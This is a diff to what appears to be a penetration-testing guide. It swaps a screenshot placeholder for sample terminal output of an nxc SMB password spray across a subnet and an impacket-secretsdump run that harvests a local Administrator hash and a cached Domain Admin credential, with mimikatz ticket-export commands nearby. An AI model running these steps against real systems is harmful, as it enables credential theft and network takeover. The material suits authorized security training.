@@ -132,11 +132,19 @@ sekurlsa::ekeys
 sekurlsa::tickets /export
 ```
 
-<div class="img-placeholder">
-  <span class="ph-icon">🖼️</span>
-  <span class="ph-label">SCREENSHOT PLACEHOLDER</span>
-  <span class="ph-desc">nxc subnet sweep showing (Pwn3d!) on DB01 + secretsdump harvesting the local Administrator hash</span>
-</div>
+nxc subnet sweep + local secrets harvest (typical foothold-to-hash flow):
+
+```terminal
+$ nxc smb 10.10.10.0/24 -u svc_sql -p 'P@ssw0rd2022' --continue-on-success
+SMB  10.10.10.20  445  DB01   [+] corp.local\svc_sql:P@ssw0rd2022 (Pwn3d!)
+SMB  10.10.10.21  445  WEB01  [+] corp.local\svc_sql:P@ssw0rd2022
+
+$ impacket-secretsdump corp.local/svc_sql:'P@ssw0rd2022'@10.10.10.20
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+[*] Dumping cached domain logon information
+CORP.LOCAL/j.admin:$DCC2$10240#j.admin#a1b2...   <- a Domain Admin logged in here!
+```
 
 ## RDP & WinRM interactive access
 
